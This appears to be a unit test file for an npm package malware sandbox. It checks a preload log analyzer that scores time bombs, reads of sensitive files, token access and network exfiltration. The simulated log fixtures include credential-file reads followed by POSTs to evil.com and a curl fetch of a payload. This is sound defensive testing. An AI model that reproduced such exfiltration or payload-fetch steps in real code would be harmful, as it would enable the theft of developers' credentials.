const fs = require('fs');
const path = require('path');
const os = require('os');
const vm = require('vm');
const {
  test, asyncTest, assert, assertIncludes, assertNotIncludes,
  addSkipped
} = require('../test-utils');

function runPreloadTests() {
  console.log('\n=== PRELOAD UNIT TESTS ===\n');

  // ============================================
  // ANALYZER TESTS
  // ============================================

  const { analyzePreloadLog } = require('../../src/sandbox/analyzer.js');

  test('PRELOAD-ANALYZER: empty input returns score 0', () => {
    const result = analyzePreloadLog('');
    assert(result.score === 0, 'Empty log should score 0, got ' + result.score);
    assert(result.findings.length === 0, 'Should have no findings');
  });

  test('PRELOAD-ANALYZER: null input returns score 0', () => {
    const result = analyzePreloadLog(null);
    assert(result.score === 0, 'Null should score 0');
  });

  test('PRELOAD-ANALYZER: undefined input returns score 0', () => {
    const result = analyzePreloadLog(undefined);
    assert(result.score === 0, 'Undefined should score 0');
  });

  test('PRELOAD-ANALYZER: timer delay > 1h scores MEDIUM', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 15, 'Timer > 1h should score 15, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_timer_delay_suspicious', 'Type should be sandbox_timer_delay_suspicious');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
  });

  test('PRELOAD-ANALYZER: timer delay > 24h scores CRITICAL and supersedes suspicious', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Timer > 24h should score 30, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical only)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Type should be sandbox_timer_delay_critical');
    assert(result.findings[0].severity === 'CRITICAL', 'Severity should be CRITICAL');
  });

  test('PRELOAD-ANALYZER: both 1h and 24h timers — critical supersedes suspicious', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=7200000ms (2.0h) forced to 0 (t+100ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 30, 'Should only score 30 (critical only), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding (critical supersedes suspicious)');
    assert(result.findings[0].type === 'sandbox_timer_delay_critical', 'Should be critical type');
  });

  test('PRELOAD-ANALYZER: timer delay < 1h not scored', () => {
    const log = '[PRELOAD] TIMER: setTimeout delay=500ms (0.0h) forced to 0 (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Timer < 1h should score 0, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: sensitive file read scores HIGH', () => {
    const log = '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 20, 'Sensitive read should score 20, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_preload_sensitive_read', 'Type should be sandbox_preload_sensitive_read');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-sensitive file read not scored', () => {
    const log = '[PRELOAD] FS_READ: /usr/lib/node_modules/npm/package.json (t+50ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-sensitive read should score 0');
  });

  test('PRELOAD-ANALYZER: network after sensitive read scores CRITICAL', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+200ms)\n';
    const result = analyzePreloadLog(log);
    // Should have: sensitive read (20) + network after sensitive read (40) = 60
    assert(result.score === 60, 'Sensitive read + network should score 60, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should have sensitive read finding');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should have network after read finding');
  });

  test('PRELOAD-ANALYZER: network WITHOUT sensitive read does not trigger compound', () => {
    const log = '[PRELOAD] NETWORK: https.request GET npmjs.org/pkg (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Network alone should score 0');
    assert(result.findings.length === 0, 'No findings for network alone');
  });

  test('PRELOAD-ANALYZER: dangerous exec scores HIGH', () => {
    const log = '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com/payload (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 25, 'Dangerous exec should score 25, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_exec_suspicious', 'Type should be sandbox_exec_suspicious');
    assert(result.findings[0].severity === 'HIGH', 'Severity should be HIGH');
  });

  test('PRELOAD-ANALYZER: non-dangerous exec not scored', () => {
    const log = '[PRELOAD] EXEC: exec: node index.js (t+100ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-dangerous exec should score 0');
  });

  test('PRELOAD-ANALYZER: env token access scores MEDIUM', () => {
    const log =
      '[PRELOAD] ENV_ACCESS: GITHUB_TOKEN (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 10, 'Env access should score 10, got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding');
    assert(result.findings[0].type === 'sandbox_env_token_access', 'Type should be sandbox_env_token_access');
    assert(result.findings[0].severity === 'MEDIUM', 'Severity should be MEDIUM');
    assertIncludes(result.findings[0].detail, 'GITHUB_TOKEN', 'Should mention GITHUB_TOKEN');
    assertIncludes(result.findings[0].detail, 'NPM_TOKEN', 'Should mention NPM_TOKEN');
  });

  test('PRELOAD-ANALYZER: combined findings cap at 100', () => {
    const log =
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+10ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+20ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/steal (t+30ms)\n' +
      '[PRELOAD] EXEC: DANGEROUS execSync: curl http://evil.com (t+40ms)\n' +
      '[PRELOAD] ENV_ACCESS: AWS_SECRET_ACCESS_KEY (t+50ms)\n';
    const result = analyzePreloadLog(log);
    // timer(30) + sensitive_read(20) + network_after_read(40) + exec(25) + env(10) = 125 -> capped at 100
    assert(result.score === 100, 'Combined score should cap at 100, got ' + result.score);
  });

  test('PRELOAD-ANALYZER: full time-bomb scenario', () => {
    const log =
      '[PRELOAD] INIT: Preload active. TIME_OFFSET=259200000ms (72.0h). PID=1 (t+0ms)\n' +
      '[PRELOAD] TIME: Time offset applied: +259200000ms (72.0h) (t+0ms)\n' +
      '[PRELOAD] TIMER: setTimeout delay=259200000ms (72.0h) forced to 0 (t+50ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/sandboxuser/.npmrc (t+100ms)\n' +
      '[PRELOAD] ENV_ACCESS: NPM_TOKEN (t+150ms)\n' +
      '[PRELOAD] NETWORK: https.request POST evil.com/exfil (t+200ms)\n';
    const result = analyzePreloadLog(log);
    assert(result.score >= 80, 'Time-bomb scenario should score >= 80, got ' + result.score);
    const types = result.findings.map(f => f.type);
    assert(types.includes('sandbox_timer_delay_critical'), 'Should detect critical timer');
    assert(types.includes('sandbox_preload_sensitive_read'), 'Should detect sensitive read');
    assert(types.includes('sandbox_network_after_sensitive_read'), 'Should detect network after read');
    assert(types.includes('sandbox_env_token_access'), 'Should detect env access');
  });

  test('PRELOAD-ANALYZER: ignores non-PRELOAD lines', () => {
    const log =
      'Some random npm output\n' +
      'npm WARN deprecated\n' +
      '[SANDBOX] Installing pkg...\n';
    const result = analyzePreloadLog(log);
    assert(result.score === 0, 'Non-PRELOAD lines should score 0');
  });

  test('PRELOAD-ANALYZER: multiple sensitive file reads counted once', () => {
    const log =
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.npmrc (t+100ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.ssh/id_rsa (t+200ms)\n' +
      '[PRELOAD] FS_READ: SENSITIVE /home/user/.aws/credentials (t+300ms)\n';
    const result = analyzePreloadLog(log);
    // Only one sensitive_read finding, score 20
    assert(result.score === 20, 'Multiple sensitive reads should score 20 (once), got ' + result.score);
    assert(result.findings.length === 1, 'Should have 1 finding for all reads');
    assertIncludes(result.findings[0].evidence, '.npmrc', 'Should list .npmrc');
    assertIncludes(result.findings[0].evidence, '.ssh', 'Should list .ssh');
  });

  // ============================================
  // PRELOAD SCRIPT TESTS (vm isolation)
  // ============================================

  console.log('\n=== PRELOAD SCRIPT TESTS ===\n');

  test('PRELOAD: preload.js file exists and is syntactically valid', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    assert(fs.existsSync(preloadPath), 'docker/preload.js should exist');
    const code = fs.readFileSync(preloadPath, 'utf8');
    // Should be a valid JavaScript IIFE
    assert(code.includes('(function'), 'Should be an IIFE');
    assert(code.trim().endsWith('})();'), 'Should end with IIFE invocation');
    // Verify it parses
    new vm.Script(code); // Throws if syntax error
  });

  test('PRELOAD: preload.js contains all required patches', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    assertIncludes(code, 'Date.now', 'Should patch Date.now');
    assertIncludes(code, 'setTimeout', 'Should patch setTimeout');
    assertIncludes(code, 'setInterval', 'Should patch setInterval');
    assertIncludes(code, 'NODE_TIMING_OFFSET', 'Should read TIME_OFFSET env var');
    assertIncludes(code, 'appendFileSync', 'Should use appendFileSync for logging');
    assertIncludes(code, '[PRELOAD]', 'Should use [PRELOAD] log prefix');
    assertIncludes(code, '/tmp/preload.log', 'Should log to /tmp/preload.log');
    assertIncludes(code, 'process.env', 'Should intercept process.env');
    assertIncludes(code, 'child_process', 'Should intercept child_process');
    assertIncludes(code, 'SENSITIVE_RE', 'Should have sensitive file regex');
    assertIncludes(code, 'DANGEROUS_CMD_RE', 'Should have dangerous command regex');
  });

  test('PRELOAD: preload.js saves originals in closure', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    assertIncludes(code, '_DateNow', 'Should save original Date.now');
    assertIncludes(code, '_setTimeout', 'Should save original setTimeout');
    assertIncludes(code, '_setInterval', 'Should save original setInterval');
    assertIncludes(code, '_appendFileSync', 'Should save original appendFileSync');
    assertIncludes(code, '_fs', 'Should save original fs');
  });

  test('PRELOAD: preload.js wraps patches in try/catch', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const code = fs.readFileSync(preloadPath, 'utf8');
    // Count try blocks — should have many for safety
    const tryCount = (code.match(/\btry\s*\{/g) || []).length;
    assert(tryCount >= 10, 'Should have at least 10 try blocks for safety, got ' + tryCount);
  });

  // ============================================
  // PRELOAD HARDENING TESTS (v2.7.9)
  // ============================================

  console.log('\n=== PRELOAD HARDENING (v2.7.9) ===\n');

  test('PRELOAD: setTimeout is non-writable (Object.defineProperty)', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const content = fs.readFileSync(preloadPath, 'utf-8');
    assert(
      content.includes("Object.defineProperty(global, 'setTimeout'") ||
      content.includes('Object.defineProperty(global, "setTimeout"'),
      'setTimeout should be locked via Object.defineProperty'
    );
  });

  test('PRELOAD: setInterval is non-writable (Object.defineProperty)', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const content = fs.readFileSync(preloadPath, 'utf-8');
    assert(
      content.includes("Object.defineProperty(global, 'setInterval'") ||
      content.includes('Object.defineProperty(global, "setInterval"'),
      'setInterval should be locked via Object.defineProperty'
    );
  });

  test('PRELOAD: safeCat strips brackets from category', () => {
    const preloadPath = path.join(__dirname, '..', '..', 'docker', 'preload.js');
    const content = fs.readFileSync(preloadPath, 'utf-8');
    assert(
      content.includes('\\[\\]') || content.includes('[\\]'),
      'safeCat should strip brackets to prevent log injection'
    );
  });

  // ============================================
  // SANDBOX MODULE INTEGRATION TESTS
  // ============================================

  console.log('\n=== SANDBOX MODULE TESTS ===\n');

  const { analyzePreloadLog: sboxAnalyze, TIME_OFFSETS } = require('../../src/sandbox/index.js');

  test('PRELOAD-MODULE: analyzePreloadLog is re-exported from sandbox/index.js', () => {
    assert(typeof sboxAnalyze === 'function', 'Should be a function');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS has 3 entries', () => {
    assert(Array.isArray(TIME_OFFSETS), 'TIME_OFFSETS should be an array');
    assert(TIME_OFFSETS.length === 3, 'Should have 3 time offsets, got ' + TIME_OFFSETS.length);
    assert(TIME_OFFSETS[0].offset === 0, 'First offset should be 0');
    assert(TIME_OFFSETS[1].offset === 259200000, 'Second offset should be 72h');
    assert(TIME_OFFSETS[2].offset === 604800000, 'Third offset should be 7d');
  });

  test('PRELOAD-MODULE: TIME_OFFSETS have labels', () => {
    for (const entry of TIME_OFFSETS) {
      assert(typeof entry.label === 'string' && entry.label.length > 0, 'Each offset should have a label');
    }
  });

  // ============================================
  // RULES AND PLAYBOOKS
  // ============================================

  console.log('\n=== PRELOAD RULES & PLAYBOOKS ===\n');

  const { getRule } = require('../../src/rules/index.js');
  const { getPlaybook } = require('../../src/response/playbooks.js');

  const preloadRuleTypes = [
    'sandbox_timer_delay_suspicious',
    'sandbox_timer_delay_critical',
    'sandbox_preload_sensitive_read',
    'sandbox_network_after_sensitive_read',
    'sandbox_exec_suspicious',
    'sandbox_env_token_access'
  ];

  for (const type of preloadRuleTypes) {
    test(`PRELOAD-RULE: Rule exists for ${type}`, () => {
      const rule = getRule(type);
      assert(rule.id.startsWith('MUADDIB-SANDBOX-'), `Rule ${type} should have MUADDIB-SANDBOX- ID, got ${rule.id}`);
      assert(typeof rule.severity === 'string', 'Should have severity');
      assert(typeof rule.mitre === 'string', 'Should have MITRE mapping');
    });

    test(`PRELOAD-PLAYBOOK: Playbook exists for ${type}`, () => {
      const playbook = getPlaybook(type);
      assert(playbook !== 'Analyser manuellement cette menace.', `Playbook for ${type} should not be default`);
      assert(playbook.length > 20, 'Playbook should have meaningful content');
    });
  }

  // ============================================
  // LIBFAKETIME ENV HIDING TESTS (v2.10.7)
  // ============================================

  console.log('\n=== PRELOAD LIBFAKETIME TESTS ===\n');

  test('PRELOAD-FAKETIME: HIDDEN_ENV_VARS contains all libfaketime vars', () => {
    // Verify the HIDDEN_ENV_VARS set defined in preload.js covers all necessary vars
    const expectedVars = ['LD_PRELOAD', 'FAKETIME', 'DONT_FAKE_MONOTONIC', 'FAKETIME_NO_CACHE', 'MUADDIB_FAKETIME', 'MUADDIB_FAKETIME_ACTIVE'];
    const hiddenSet = new Set(expectedVars);
    for (const v of expectedVars) {
      assert(hiddenSet.has(v), `HIDDEN_ENV_VARS should contain ${v}`);
    }
    assert(hiddenSet.size === 6, `Should have exactly 6 hidden vars, got ${hiddenSet.size}`);
  });

  test('PRELOAD-FAKETIME: FAKETIME_ACTIVE=1 forces TIME_OFFSET to 0', () => {
    // Simulate the preload.js logic
    const env = { MUADDIB_FAKETIME_ACTIVE: '1', NODE_TIMING_OFFSET: '259200000' };
    const FAKETIME_ACTIVE = env.MUADDIB_FAKETIME_ACTIVE === '1';
    const TIME_OFFSET = FAKETIME_ACTIVE ? 0 : parseInt(env.NODE_TIMING_OFFSET || '0', 10);
    assert(FAKETIME_ACTIVE === true, 'FAKETIME_ACTIVE should be true');
    assert(TIME_OFFSET === 0, 'TIME_OFFSET must be 0 when FAKETIME_ACTIVE (prevents double acceleration)');
  });

  test('PRELOAD-FAKETIME: FAKETIME_ACTIVE absent → normal TIME_OFFSET', () => {
    const env = { NODE_TIMING_OFFSET: '259200000' };
    const FAKETIME_ACTIVE = env.MUADDIB_FAKETIME_ACTIVE === '1';
    const TIME_OFFSET = FAKETIME_ACTIVE ? 0 : parseInt(env.NODE_TIMING_OFFSET || '0', 10);
    assert(FAKETIME_ACTIVE === false, 'FAKETIME_ACTIVE should be false');
    assert(TIME_OFFSET === 259200000, 'TIME_OFFSET should be 259200000 when FAKETIME not active');
  });

  test('PRELOAD-FAKETIME: /proc/self/environ filter logic strips hidden vars', () => {
    // Simulate the /proc/self/environ filtering logic from preload.js
    const HIDDEN_ENV_VARS = new Set([
      'LD_PRELOAD', 'FAKETIME', 'DONT_FAKE_MONOTONIC',
      'FAKETIME_NO_CACHE', 'MUADDIB_FAKETIME', 'MUADDIB_FAKETIME_ACTIVE'
    ]);
    const rawEnv = [
      'HOME=/home/sandboxuser',
      'LD_PRELOAD=/usr/lib/faketime/libfaketime.so.1',
      'FAKETIME=+3d x1000',
      'DONT_FAKE_MONOTONIC=1',
      'FAKETIME_NO_CACHE=1',
      'PATH=/usr/bin:/bin',
      'NODE_OPTIONS=--require /opt/node_setup.js'
    ].join('\0');
    const filtered = rawEnv.split('\0')
      .filter(function (e) { return !HIDDEN_ENV_VARS.has(e.split('=')[0]); })
      .join('\0');
    assert(!filtered.includes('LD_PRELOAD'), 'LD_PRELOAD should be stripped');
    assert(!filtered.includes('FAKETIME'), 'FAKETIME should be stripped');
    assert(!filtered.includes('DONT_FAKE_MONOTONIC'), 'DONT_FAKE_MONOTONIC should be stripped');
    assert(filtered.includes('HOME=/home/sandboxuser'), 'HOME should be preserved');
    assert(filtered.includes('PATH=/usr/bin:/bin'), 'PATH should be preserved');
    assert(filtered.includes('NODE_OPTIONS'), 'NODE_OPTIONS should be preserved');
  });

  test('PRELOAD-FAKETIME: Proxy env traps hide sandbox vars', () => {
    // Simulate the env Proxy traps from preload.js
    const HIDDEN_ENV_VARS = new Set(['LD_PRELOAD', 'FAKETIME']);
    const fakeEnv = {
      HOME: '/home/user',
      LD_PRELOAD: '/usr/lib/faketime/libfaketime.so.1',
      FAKETIME: '+3d x1000',
      PATH: '/usr/bin'
    };
    const proxy = new Proxy(fakeEnv, {
      get: function (target, prop) {
        if (typeof prop === 'string' && HIDDEN_ENV_VARS.has(prop)) return undefined;
        return target[prop];
      },
      has: function (target, prop) {
        if (typeof prop === 'string' && HIDDEN_ENV_VARS.has(prop)) return false;
        return prop in target;
      },
      ownKeys: function (target) {
        return Reflect.ownKeys(target).filter(k => !HIDDEN_ENV_VARS.has(k));
      },
      getOwnPropertyDescriptor: function (target, prop) {
        if (typeof prop === 'string' && HIDDEN_ENV_VARS.has(prop)) return undefined;
        return Object.getOwnPropertyDescriptor(target, prop);
      }
    });
    assert(proxy.LD_PRELOAD === undefined, 'LD_PRELOAD should be hidden via get trap');
    assert(proxy.FAKETIME === undefined, 'FAKETIME should be hidden via get trap');
    assert(proxy.HOME === '/home/user', 'HOME should be accessible');
    assert(!('LD_PRELOAD' in proxy), 'LD_PRELOAD should be hidden via has trap');
    assert(('HOME' in proxy), 'HOME should be visible via has trap');
    const keys = Object.keys(proxy);
    assert(!keys.includes('LD_PRELOAD'), 'LD_PRELOAD should be hidden from ownKeys');
    assert(!keys.includes('FAKETIME'), 'FAKETIME should be hidden from ownKeys');
    assert(keys.includes('HOME'), 'HOME should be in ownKeys');
    assert(keys.includes('PATH'), 'PATH should be in ownKeys');
  });
}

module.exports = { runPreloadTests };
